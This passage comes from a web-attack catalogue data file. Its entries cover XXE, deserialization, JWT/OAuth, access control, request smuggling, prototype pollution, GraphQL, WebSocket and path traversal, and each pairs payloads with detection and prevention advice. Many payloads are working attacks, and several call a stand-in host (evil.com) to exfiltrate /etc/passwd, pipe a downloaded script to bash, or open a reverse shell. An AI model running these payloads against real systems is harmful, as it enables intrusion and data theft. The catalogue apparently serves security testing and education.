      prevention: "Disable DTD processing. Disable external entity loading. Use JSON instead of XML where possible. Set XMLReader features to disable external entities.",
      references: ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
      cwes: ["CWE-611"]
    },
    {
      name: "XXE — Blind Out-of-Band",
      category: "XXE",
      description: "Application is vulnerable to XXE but doesn't display the entity value in the response. Data is exfiltrated by making the server send the file contents to an attacker-controlled server via HTTP or DNS.",
      impact: "File read via out-of-band exfiltration. Works even when the application returns no visible output.",
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/?data=file:///etc/passwd">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><root>&send;</root>'
      ],
      detection: "Monitor outbound HTTP connections from XML parsers. Alert on DNS queries to unexpected domains during XML processing.",
      prevention: "Disable DTD processing entirely. Block outbound connections from XML processing components.",
      references: ["https://portswigger.net/web-security/xxe/blind"],
      cwes: ["CWE-611"]
    },
    {
      name: "XXE — Parameter Entities",
      category: "XXE",
      description: "Uses parameter entities (% prefix) which are processed within the DTD itself. Can bypass restrictions on regular entities and enable blind exfiltration.",
      impact: "Bypass entity restrictions. Enable data exfiltration through DTD-level processing.",
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?x=%xxe;\'>">%eval;%exfil;]>',
        '<!DOCTYPE foo [<!ENTITY % aaa SYSTEM "http://evil.com/ext.dtd">%aaa;%ccc;%ddd;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/collect.dtd">%dtd;]><root>test</root>'
      ],
      detection: "Detect parameter entity declarations (<!ENTITY %) in XML input. Monitor for DTD fetches to external servers.",
      prevention: "Disable DTD processing. Block all external entity and parameter entity resolution.",
      references: ["https://portswigger.net/web-security/xxe"],
      cwes: ["CWE-611"]
    }
  ],

  "Insecure Deserialization": [
    {
      name: "Java Deserialization",
      category: "Deserialization",
      description: "Java's ObjectInputStream deserializes untrusted data, triggering gadget chains in libraries like Commons Collections, Spring, and others. Leads to remote code execution.",
      impact: "Remote code execution. Full server compromise via crafted serialized objects.",
      payloads: [
        "ysoserial CommonsCollections1 'id'",
        "ysoserial CommonsCollections5 'curl evil.com/shell.sh|bash'",
        "ysoserial Spring1 'touch /tmp/pwned'",
        "ysoserial Jdk7u21 'wget http://evil.com/reverse.sh -O /tmp/r.sh && bash /tmp/r.sh'",
        "ysoserial URLDNS 'http://burpcollaborator.net'",
        "ysoserial CommonsCollections7 '/bin/bash -c {echo,base64payload}|{base64,-d}|bash'",
        "ysoserial BeanShell1 'Runtime.getRuntime().exec(\"id\")'"
      ],
      detection: "Look for Java serialized objects (magic bytes: AC ED 00 05 or rO0AB in base64). Monitor for known gadget chain classes in deserialization streams.",
      prevention: "Avoid Java native serialization. Use look-ahead deserialization (ValidatingObjectInputStream). Implement allowlist-based class filtering. Use JSON/protobuf instead.",
      references: ["https://github.com/frohoff/ysoserial"],
      cwes: ["CWE-502"]
    },
    {
      name: "PHP Deserialization",
      category: "Deserialization",
      description: "PHP's unserialize() on user input triggers __wakeup(), __destruct(), and other magic methods. Phar archives can also trigger deserialization via phar:// stream wrapper.",
      impact: "Remote code execution, file operations, SQL injection via magic methods in application classes.",
      payloads: [
        'O:8:"stdClass":0:{}',
        'a:2:{s:4:"user";s:5:"admin";s:4:"role";s:5:"admin";}',
        'O:14:"DatabaseExport":1:{s:8:"filename";s:11:"/etc/passwd";}',
        'phar:///uploads/avatar.jpg/test.txt',
        'O:7:"Archive":1:{s:8:"filename";s:36:"php://filter/convert.base64-encode/resource=/etc/passwd";}'
      ],
      detection: "Detect serialized PHP objects (O:, a:, s: patterns) in user input. Monitor for phar:// wrapper usage. Audit __wakeup and __destruct methods.",
      prevention: "Never unserialize user input. Use json_decode instead. If unavoidable, use allowed_classes parameter. Disable phar:// wrapper.",
      references: ["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"],
      cwes: ["CWE-502"]
    },
    {
      name: "Python Pickle Deserialization",
      category: "Deserialization",
      description: "Python's pickle module can execute arbitrary code during deserialization via the __reduce__ method. Any user-controlled pickle data leads to RCE.",
      impact: "Remote code execution. Arbitrary Python code execution during unpickling.",
      payloads: [
        "import pickle, os; pickle.dumps(type('X',(),{'__reduce__':lambda s:( os.system,('id',))})())",
        "cos\\nsystem\\n(S'id'\\ntR.",
        "csubprocess\\ncheck_output\\n(S'whoami'\\ntR.",
        "(S'__import__(\"os\").system(\"id\")'\\nios\\nsystem\\n."
      ],
      detection: "Never accept pickle data from untrusted sources. Detect pickle magic bytes (\\x80). Monitor for pickle.loads() calls on user input.",
      prevention: "Never unpickle untrusted data. Use JSON, MessagePack, or protobuf. If pickle is required, use hmac signing and restricted unpickler.",
      references: ["https://docs.python.org/3/library/pickle.html"],
      cwes: ["CWE-502"]
    },
    {
      name: ".NET Deserialization",
      category: "Deserialization",
      description: "Vulnerabilities in .NET BinaryFormatter, SoapFormatter, NetDataContractSerializer, LosFormatter, ObjectStateFormatter (ViewState), and others allow RCE through crafted payloads.",
      impact: "Remote code execution via ViewState, SOAP messages, or binary serialization streams.",
      payloads: [
        "ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'whoami'",
        "ysoserial.net -g WindowsIdentity -f BinaryFormatter -c 'calc'",
        "ysoserial.net -g PSObject -f BinaryFormatter -c 'id'",
        "__VIEWSTATE=<crafted_base64_payload>",
        "ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c 'cmd /c whoami'"
      ],
      detection: "Monitor for BinaryFormatter usage. Check ViewState MAC validation. Detect crafted .NET serialization payloads.",
      prevention: "Never use BinaryFormatter. Enable ViewState MAC validation. Use DataContractSerializer with known types. Migrate to System.Text.Json.",
      references: ["https://github.com/pwntester/ysoserial.net"],
      cwes: ["CWE-502"]
    },
    {
      name: "Node.js Deserialization",
      category: "Deserialization",
      description: "The node-serialize library's unserialize() function can execute arbitrary code through Immediately Invoked Function Expressions (IIFE) embedded in serialized data.",
      impact: "Remote code execution on the Node.js server.",
      payloads: [
        '{"username":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}',
        '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'curl evil.com/shell|bash\')}()"}',
        '{"payload":"_$$ND_FUNC$$_function(){var net=require(\'net\'),sh=require(\'child_process\').exec(\'/bin/sh\');var client=new net.Socket();client.connect(4444,\'evil.com\',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)})}()"}'
      ],
      detection: "Detect _$$ND_FUNC$$_ pattern in user input. Audit usage of node-serialize library.",
      prevention: "Do not use node-serialize for untrusted data. Use JSON.parse() which is safe. Validate serialized data structure before processing.",
      references: ["https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"],
      cwes: ["CWE-502"]
    }
  ],

  "Broken Authentication": [
    {
      name: "JWT None Algorithm Attack",
      category: "Authentication",
      description: "JWT libraries that accept 'none' as a valid algorithm allow attackers to forge tokens by removing the signature and setting alg to 'none'.",
      impact: "Complete authentication bypass. Attacker can forge any JWT claim including admin roles.",
      payloads: [
        '{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.""',
        '{"alg":"None","typ":"JWT"}.{"sub":"1","admin":true}.""',
        '{"alg":"NONE","typ":"JWT"}.{"sub":"admin"}.""',
        '{"alg":"nOnE","typ":"JWT"}.{"sub":"admin","iat":9999999999}.'
      ],
      detection: "Alert on JWT tokens with alg:none. Monitor for tokens without valid signatures.",
      prevention: "Explicitly specify allowed algorithms in JWT verification. Never accept 'none' algorithm. Use a well-maintained JWT library.",
      references: ["https://portswigger.net/web-security/jwt"],
      cwes: ["CWE-327", "CWE-287"]
    },
    {
      name: "JWT Key Confusion (RS256 to HS256)",
      category: "Authentication",
      description: "If the server uses RS256 (asymmetric) but also accepts HS256 (symmetric), an attacker can sign the JWT with the server's public key using HS256, since the server will use the same public key as the HMAC secret.",
      impact: "Token forgery. Attacker can create valid tokens signed with the public key.",
      payloads: [
        "Change header alg from RS256 to HS256, sign with server's public RSA key as HMAC secret",
        "python3 jwt_tool.py TOKEN -X k -pk public.pem",
        "jwt.encode({'sub':'admin','role':'admin'}, open('public.pem').read(), algorithm='HS256')"
      ],
      detection: "Alert on algorithm changes in JWT headers. Monitor for HS256 tokens when only RS256 is expected.",
      prevention: "Explicitly specify the expected algorithm in verification. Use separate key sets for different algorithms. Never allow algorithm switching.",
      references: ["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
      cwes: ["CWE-327", "CWE-287"]
    },
    {
      name: "JWT JKU/JWK Header Injection",
      category: "Authentication",
      description: "JWT headers can contain jku (JWK Set URL) or jwk (embedded key) that tells the server where to find the verification key. Attacker hosts their own key and points the JWT to it.",
      impact: "Complete authentication bypass by forcing the server to verify against attacker-controlled keys.",
      payloads: [
        '{"alg":"RS256","jku":"https://evil.com/.well-known/jwks.json","kid":"attacker-key"}',
        '{"alg":"RS256","jwk":{"kty":"RSA","n":"attacker-modulus","e":"AQAB"}}',
        '{"alg":"RS256","jku":"https://evil.com/keys","kid":"1"}'
      ],
      detection: "Alert on jku/jwk/x5u/x5c headers pointing to external domains. Whitelist allowed key sources.",
      prevention: "Ignore jku/jwk/x5u/x5c headers in tokens. Use locally configured keys only. If jku is needed, whitelist allowed URLs.",
      references: ["https://portswigger.net/web-security/jwt"],
      cwes: ["CWE-287", "CWE-345"]
    },
    {
      name: "OAuth Misconfiguration",
      category: "Authentication",
      description: "Misconfigurations in OAuth 2.0 flows: open redirects in redirect_uri, missing state parameter (CSRF), authorization code reuse, token leakage via referrer.",
      impact: "Account takeover, authorization code theft, CSRF attacks, token hijacking.",
      payloads: [
        "redirect_uri=https://evil.com/callback",
        "redirect_uri=https://legit.com/callback/../../../evil.com",
        "redirect_uri=https://legit.com/callback%23@evil.com",
        "redirect_uri=https://legit.com/callback?next=https://evil.com",
        "response_type=token (implicit flow token in URL fragment)",
        "Missing state parameter allows CSRF login attacks"
      ],
      detection: "Validate redirect_uri strictly against registered callbacks. Require and validate state parameter. Monitor for unusual redirect patterns.",
      prevention: "Exact string matching for redirect_uri. Use PKCE for public clients. Require state parameter. Use authorization code flow with PKCE over implicit flow.",
      references: ["https://portswigger.net/web-security/oauth"],
      cwes: ["CWE-601", "CWE-352"]
    },
    {
      name: "SAML Attacks",
      category: "Authentication",
      description: "Attacks against SAML authentication including XML signature wrapping, comment injection in NameID, certificate confusion, and replay attacks.",
      impact: "Authentication bypass, identity spoofing, privilege escalation in SSO environments.",
      payloads: [
        "XML Signature Wrapping: duplicate the signed assertion with modified attributes",
        "NameID comment injection: admin@company.com becomes admin@company.com.evil.com",
        "SAML assertion replay after session expiry",
        "Certificate confusion: register SP with attacker's cert"
      ],
      detection: "Validate XML signatures strictly. Check for duplicate elements. Enforce assertion expiry. Validate certificate chain.",
      prevention: "Use well-tested SAML libraries. Validate XML canonicalization. Enforce NotOnOrAfter. Validate InResponseTo. Use SAML 2.0 bindings correctly.",
      references: ["https://portswigger.net/web-security/saml"],
      cwes: ["CWE-287", "CWE-347"]
    },
    {
      name: "Session Fixation",
      category: "Authentication",
      description: "Attacker sets a known session ID before the victim authenticates. After login, the attacker uses the same session ID to hijack the authenticated session.",
      impact: "Session hijacking. Attacker gains authenticated access to victim's account.",
      payloads: [
        "Set-Cookie: JSESSIONID=attacker-known-value (via XSS or meta tag)",
        "http://target.com/login?PHPSESSID=attacker-known-value",
        "<meta http-equiv=Set-Cookie content='PHPSESSID=fixed-value'>",
        "http://target.com/login;jsessionid=attacker-value"
      ],
      detection: "Monitor for session IDs set before authentication. Alert on session ID changes that don't follow login events.",
      prevention: "Regenerate session ID after authentication. Reject externally set session IDs. Use Strict session cookie attribute.",
      references: ["https://owasp.org/www-community/attacks/Session_fixation"],
      cwes: ["CWE-384"]
    },
    {
      name: "Password Reset Poisoning",
      category: "Authentication",
      description: "Attacker manipulates the Host header or X-Forwarded-Host during a password reset request, causing the reset link to point to an attacker-controlled domain.",
      impact: "Password reset token theft. Account takeover when victim clicks the poisoned reset link.",
      payloads: [
        "Host: evil.com (during password reset request)",
        "X-Forwarded-Host: evil.com",
        "Host: target.com\\r\\nHost: evil.com",
        "X-Original-Host: evil.com"
      ],
      detection: "Validate Host header against expected values. Monitor for password reset emails with unexpected domains.",
      prevention: "Hardcode the application URL in reset emails. Don't use Host header for URL generation. Validate Host header against whitelist.",
      references: ["https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning"],
      cwes: ["CWE-640"]
    }
  ],

  "Broken Access Control": [
    {
      name: "Insecure Direct Object Reference (IDOR)",
      category: "Access Control",
      description: "Application exposes internal object references (database IDs, file paths) in URLs or parameters without verifying the user is authorized to access that object.",
      impact: "Unauthorized data access. View, modify, or delete other users' data by changing ID parameters.",
      payloads: [
        "/api/users/1 → /api/users/2",
        "/api/orders/1001 → /api/orders/1002",
        "/download?file=report_123.pdf → /download?file=report_124.pdf",
        "/api/invoice/INVOICE-2024-001 → /api/invoice/INVOICE-2024-002",
        "/profile?id=my-uuid → /profile?id=other-uuid",
        "POST /api/transfer {from_account: 'mine', to_account: 'attacker', amount: 1000} → {from_account: 'victim', ...}",
        "/api/v1/documents/abc123 → enumerate with UUIDs from other endpoints"
      ],
      detection: "Log and alert on access pattern anomalies. Monitor for sequential ID enumeration. Compare requested object ownership with authenticated user.",
      prevention: "Always verify object ownership on the server side. Use indirect references (UUIDs). Implement proper authorization checks on every access.",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"],
      cwes: ["CWE-639"]
    },
    {
      name: "CORS Misconfiguration",
      category: "Access Control",
      description: "Overly permissive Cross-Origin Resource Sharing headers allow unauthorized domains to read responses from the vulnerable application via the victim's browser.",
      impact: "Cross-origin data theft. Read sensitive API responses, CSRF bypass, credential theft.",
      payloads: [
        "Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com",
        "Origin: null → Access-Control-Allow-Origin: null",
        "Origin: https://target.com.evil.com → reflected if suffix-matched",
        "Origin: https://eviltarget.com → reflected if only prefix checked",
        "Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true (invalid but sometimes misconfigured)"
      ],
      detection: "Test with various Origin headers. Check if credentials are allowed with wildcard origins. Audit CORS configuration.",
      prevention: "Whitelist specific trusted origins. Never reflect arbitrary Origin headers. Don't use Access-Control-Allow-Origin: * with credentials. Validate against exact matches.",
      references: ["https://portswigger.net/web-security/cors"],
      cwes: ["CWE-942"]
    },
    {
      name: "Open Redirect",
      category: "Access Control",
      description: "Application redirects users to a URL specified in a parameter without validation. Used for phishing and to bypass URL-based security checks.",
      impact: "Phishing attacks using trusted domain. OAuth token theft. Bypass URL-based security filters.",
      payloads: [
        "/redirect?url=https://evil.com",
        "/redirect?url=//evil.com",
        "/redirect?url=\\/\\/evil.com",
        "/redirect?url=https:evil.com",
        "/redirect?url=http://evil.com%2f%2f",
        "/redirect?url=////evil.com",
        "/redirect?url=https://target.com@evil.com",
        "/redirect?url=https://target.com%23@evil.com",
        "/redirect?url=https://evil.com/.target.com",
        "/redirect?url=data:text/html,<script>alert(1)</script>",
        "/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"
      ],
      detection: "Monitor redirect parameters for external domains. Alert on redirects to non-whitelisted URLs.",
      prevention: "Whitelist allowed redirect destinations. Use indirect references (map IDs to URLs). Validate against same-origin. Don't use user input for redirects.",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect"],
      cwes: ["CWE-601"]
    },
    {
      name: "Clickjacking",
      category: "Access Control",
      description: "Attacker loads the target site in a transparent iframe overlaid on a decoy page, tricking users into clicking buttons or links on the hidden target site.",
      impact: "Unauthorized actions performed by the victim: changing email, transferring funds, granting permissions.",
      payloads: [
        '<iframe src="https://target.com/settings" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2"></iframe><button style="z-index:1;position:relative">Click for prize!</button>',
        '<iframe src="https://target.com/delete-account" style="opacity:0.0001"></iframe>',
        'Multi-step clickjacking with draggable elements'
      ],
      detection: "Test if site can be framed. Check for X-Frame-Options and CSP frame-ancestors headers.",
      prevention: "Set X-Frame-Options: DENY or SAMEORIGIN. Use Content-Security-Policy: frame-ancestors 'self'. Implement frame-busting JavaScript as fallback.",
      references: ["https://owasp.org/www-community/attacks/Clickjacking"],
      cwes: ["CWE-1021"]
    }
  ],

  "Race Conditions": [
    {
      name: "Time-of-Check to Time-of-Use (TOCTOU)",
      category: "Race Condition",
      description: "Application checks a condition (balance, coupon usage, rate limit) and then performs an action, but an attacker sends multiple concurrent requests that all pass the check before any action updates the state.",
      impact: "Double spending, coupon reuse, rate limit bypass, duplicate transactions, privilege escalation.",
      payloads: [
        "Send 50 concurrent requests to /api/redeem-coupon with the same single-use coupon code",
        "Send 20 parallel /api/transfer requests to drain an account beyond its balance",
        "Race the /api/claim-reward endpoint to claim multiple times",
        "Concurrent requests to /api/upgrade-plan during free trial",
        "Parallel POST /api/vote to vote multiple times"
      ],
      detection: "Monitor for duplicate transactions. Alert on concurrent identical requests. Track state inconsistencies.",
      prevention: "Use database-level locking (SELECT FOR UPDATE, advisory locks). Implement idempotency keys. Use atomic compare-and-swap operations. Serialize critical sections with mutexes.",
      references: ["https://portswigger.net/web-security/race-conditions"],
      cwes: ["CWE-362", "CWE-367"]
    },
    {
      name: "Race Condition — Limit Overrun",
      category: "Race Condition",
      description: "Bypassing rate limits, attempt counters, or usage quotas by sending many requests simultaneously before the counter increments.",
      impact: "Brute force amplification, free tier abuse, bypassing security controls.",
      payloads: [
        "Turbo Intruder: send 100 login attempts in a single TCP connection using HTTP/2 single-packet attack",
        "Race rate-limited OTP verification to try thousands of codes",
        "Concurrent requests to bypass account lockout counter"
      ],
      detection: "Implement server-side atomic counters. Monitor for bursts of concurrent requests to rate-limited endpoints.",
      prevention: "Use atomic increment operations. Implement pessimistic locking on counters. Use token bucket with atomic decrement. Consider HTTP/2 connection limits.",
      references: ["https://portswigger.net/web-security/race-conditions"],
      cwes: ["CWE-362"]
    }
  ],

  "Prototype Pollution": [
    {
      name: "Server-Side Prototype Pollution",
      category: "Prototype Pollution",
      description: "Attacker modifies Object.prototype in Node.js applications through recursive merge, deep clone, or property assignment functions. Polluted properties are inherited by all objects.",
      impact: "Remote code execution (via child_process options pollution), authentication bypass (isAdmin), denial of service.",
      payloads: [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\'child_process\').execSync(\'id\').toString())", "NODE_OPTIONS": "--require /proc/self/cmdline"}}',
        '{"__proto__": {"status": 500}}',
        '{"__proto__": {"toString": true}}',
        '{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/payload.js"}}}'
      ],
      detection: "Monitor for __proto__ and constructor.prototype in JSON input. Test with prototype pollution scanner tools.",
      prevention: "Use Object.create(null) for lookup objects. Freeze Object.prototype. Use Map instead of plain objects. Validate JSON keys against __proto__ and constructor.",
      references: ["https://portswigger.net/web-security/prototype-pollution"],
      cwes: ["CWE-1321"]
    },
    {
      name: "Client-Side Prototype Pollution",
      category: "Prototype Pollution",
      description: "Prototype pollution via URL parameters, hash fragments, or postMessage that affects client-side JavaScript libraries (jQuery, Lodash, etc.) leading to XSS.",
      impact: "Cross-site scripting via gadgets in JS libraries. DOM manipulation.",
      payloads: [
        "?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
        "?__proto__.innerHTML=<img/src/onerror=alert(1)>",
        "#__proto__[src]=data:,alert(1)",
        "?constructor[prototype][href]=javascript:alert(1)",
        "?__proto__[transport_url]=data:,alert(1)//"
      ],
      detection: "Test URL parameters with __proto__ and constructor.prototype payloads. Audit client-side merge/extend functions.",
      prevention: "Use Object.create(null). Sanitize property names. Keep libraries updated. Use --frozen-intrinsics Node.js flag.",
      references: ["https://portswigger.net/web-security/prototype-pollution"],
      cwes: ["CWE-1321"]
    }
  ],

  "Web Cache Poisoning": [
    {
      name: "Web Cache Poisoning",
      category: "Cache Poisoning",
      description: "Attacker sends a request with a malicious header (X-Forwarded-Host, X-Original-URL) that gets reflected in the response. The response is cached, serving the poisoned content to all users.",
      impact: "Serve XSS payloads to all users via cache. Redirect users to malicious sites. Persistent defacement.",
      payloads: [
        "X-Forwarded-Host: evil.com (poisons <link> and <script> src attributes)",
        "X-Original-URL: /admin (accesses restricted pages via cache)",
        "X-Forwarded-Scheme: nothttps (forces HTTP redirect loop)",
        "X-Forwarded-Port: 1234 (breaks links in cached response)",
        "Accept-Language: en (cache variation for stored XSS)",
        "Transfer-Encoding: chunked (request smuggling for cache poison)"
      ],
      detection: "Test for unkeyed headers that affect response. Use Param Miner Burp extension. Monitor cache hit ratios for anomalies.",
      prevention: "Include all response-affecting headers in cache key. Disable caching for sensitive pages. Use Vary header correctly. Strip unnecessary headers before caching.",
      references: ["https://portswigger.net/web-security/web-cache-poisoning"],
      cwes: ["CWE-444"]
    }
  ],

  "HTTP Request Smuggling": [
    {
      name: "HTTP Request Smuggling — CL.TE",
      category: "Request Smuggling",
      description: "Front-end uses Content-Length, back-end uses Transfer-Encoding. Attacker crafts a request where the two servers disagree on where the request ends, smuggling a second request.",
      impact: "Bypass security controls, cache poisoning, credential hijacking, request routing manipulation.",
      payloads: [
        "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED",
        "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG",
        "POST / HTTP/1.1\\r\\nContent-Length: 44\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n"
      ],
      detection: "Send ambiguous requests and check for response desynchronization. Use HTTP Request Smuggler Burp extension.",
      prevention: "Use HTTP/2 end-to-end. Normalize request parsing. Configure front-end to reject ambiguous requests. Disable Transfer-Encoding on front-end.",
      references: ["https://portswigger.net/web-security/request-smuggling"],
      cwes: ["CWE-444"]
    },
    {
      name: "HTTP Request Smuggling — TE.CL",
      category: "Request Smuggling",
      description: "Front-end uses Transfer-Encoding, back-end uses Content-Length. The inverse of CL.TE — the back-end reads only Content-Length bytes and the remainder is treated as the start of the next request.",
      impact: "Same as CL.TE: security bypass, cache poisoning, credential hijacking.",
      payloads: [
        "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5c\\r\\nGPOST /admin HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n"
      ],
      detection: "Test with timing-based techniques. Send TE.CL probe and check for delayed response.",
      prevention: "Same as CL.TE. Ensure consistent parsing across all layers. Prefer HTTP/2.",
      references: ["https://portswigger.net/web-security/request-smuggling"],
      cwes: ["CWE-444"]
    }
  ],

  "GraphQL Attacks": [
    {
      name: "GraphQL Introspection Abuse",
      category: "GraphQL",
      description: "GraphQL introspection queries expose the entire API schema including types, fields, mutations, and relationships. Many production APIs leave introspection enabled.",
      impact: "Full API schema disclosure. Reveals hidden fields, internal types, deprecated features, and attack surface.",
      payloads: [
        '{__schema{types{name,fields{name,type{name}}}}}',
        '{__schema{queryType{fields{name,args{name,type{name}}}}}}',
        '{__schema{mutationType{fields{name,args{name,type{name,kind,ofType{name}}}}}}}',
        '{__type(name:"User"){fields{name,type{name}}}}'
      ],
      detection: "Monitor for __schema and __type queries. Alert on introspection in production.",
      prevention: "Disable introspection in production. If needed, restrict to authenticated admin users. Use schema allowlists.",
      references: ["https://portswigger.net/web-security/graphql"],
      cwes: ["CWE-200"]
    },
    {
      name: "GraphQL Injection and Abuse",
      category: "GraphQL",
      description: "Attacks against GraphQL APIs including batch queries for brute force, nested query DoS, field suggestion exploitation, and authorization bypass through direct field access.",
      impact: "Authentication bypass, denial of service, data exfiltration, brute force amplification.",
      payloads: [
        'Batch: [{query:"mutation{login(u:\\"admin\\",p:\\"pass1\\")}"},{query:"mutation{login(u:\\"admin\\",p:\\"pass2\\")}"}]',
        'Nested: {user(id:1){posts{comments{author{posts{comments{author{...}}}}}}}} (DoS)',
        'Alias: {a:user(id:1){email} b:user(id:2){email} c:user(id:3){email}} (IDOR via aliases)',
        'Directive bypass: {user(id:1){email @skip(if:false) ssn @include(if:true)}}'
      ],
      detection: "Implement query depth limits. Set query complexity analysis. Monitor for batch queries. Rate limit by query complexity.",
      prevention: "Set max query depth (10-15). Implement query cost analysis. Disable batching or limit batch size. Use persisted/allowed queries in production.",
      references: ["https://portswigger.net/web-security/graphql"],
      cwes: ["CWE-20", "CWE-400"]
    }
  ],

  "WebSocket Attacks": [
    {
      name: "Cross-Site WebSocket Hijacking (CSWSH)",
      category: "WebSocket",
      description: "WebSocket handshake relies only on cookies for authentication without CSRF tokens. Attacker's page can open a WebSocket to the target and read/write messages using the victim's session.",
      impact: "Read sensitive data from WebSocket streams. Send unauthorized commands. Full bidirectional compromise.",
      payloads: [
        '<script>var ws = new WebSocket("wss://target.com/ws"); ws.onmessage = function(e) { fetch("https://evil.com/log?d=" + btoa(e.data)); };</script>',
        '<script>var ws = new WebSocket("wss://target.com/ws"); ws.onopen = function() { ws.send(JSON.stringify({action:"getSecrets"})); };</script>'
      ],
      detection: "Check Origin header during WebSocket handshake. Monitor for connections from unexpected origins.",
      prevention: "Validate Origin header in handshake. Use CSRF tokens in the WebSocket URL or first message. Implement per-message authentication.",
      references: ["https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking"],
      cwes: ["CWE-352", "CWE-346"]
    },
    {
      name: "WebSocket Message Injection",
      category: "WebSocket",
      description: "WebSocket messages are not subject to same-origin policy after connection. If input validation is missing, attackers can inject commands or exploit server-side processing of WebSocket data.",
      impact: "Server-side injection through WebSocket messages. XSS if messages are rendered in other users' browsers.",
      payloads: [
        '{"message":"<img src=x onerror=alert(1)>"}',
        '{"action":"admin_command","cmd":"delete_all"}',
        '{"type":"subscribe","channel":"../../../admin/logs"}'
      ],
      detection: "Validate and sanitize all WebSocket message content. Implement message schema validation.",
      prevention: "Apply same input validation as HTTP endpoints. Use message schemas. Implement authorization per message type. HTML-encode before rendering.",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets"],
      cwes: ["CWE-20"]
    }
  ],

  "Miscellaneous": [
    {
      name: "HTTP Parameter Pollution",
      category: "Miscellaneous",
      description: "Sending multiple parameters with the same name. Different servers handle duplicates differently (first, last, all, array), which can bypass validation or WAF rules.",
      impact: "WAF bypass, logic manipulation, authentication bypass, access control bypass.",
      payloads: [
        "?user=admin&user=guest (some frameworks take first, others last)",
        "?amount=100&amount=1 (transfer amount manipulation)",
        "?role=user&role=admin (role escalation if server uses last value)",
        "POST: user=admin%00&user=guest (null byte variation)"
      ],
      detection: "Monitor for duplicate parameter names. Audit how the framework handles duplicate parameters.",
      prevention: "Explicitly handle duplicate parameters. Use the first value consistently. Log and alert on duplicate parameters in sensitive endpoints.",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"],
      cwes: ["CWE-235"]
    },
    {
      name: "Web Cache Deception",
      category: "Miscellaneous",
      description: "Attacker tricks a victim into visiting a URL like /account/settings/nonexistent.css. The origin serves the dynamic page (ignoring the fake extension), but the cache stores it as a static CSS file.",
      impact: "Cached sensitive pages accessible to the attacker. Credential theft, PII exposure.",
      payloads: [
        "/my-account/nonexistent.css",
        "/api/user/profile/..%2Fstatic.js",
        "/settings%2F..%2Fstatic.css",
        "/dashboard/x.jpg"
      ],
      detection: "Monitor for requests to dynamic endpoints with static file extensions. Audit cache rules for path-based caching.",
      prevention: "Cache only known static paths. Use Cache-Control: no-store for dynamic pages. Validate file extensions before caching.",
      references: ["https://portswigger.net/web-security/web-cache-deception"],
      cwes: ["CWE-524"]
    },
    {
      name: "Path Traversal",
      category: "Miscellaneous",
      description: "Application uses user input to construct file paths without proper sanitization. Attacker uses ../ sequences to access files outside the intended directory.",
      impact: "Read arbitrary files from the server. Access configuration files, source code, and sensitive data.",
      payloads: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/var/www/../../etc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
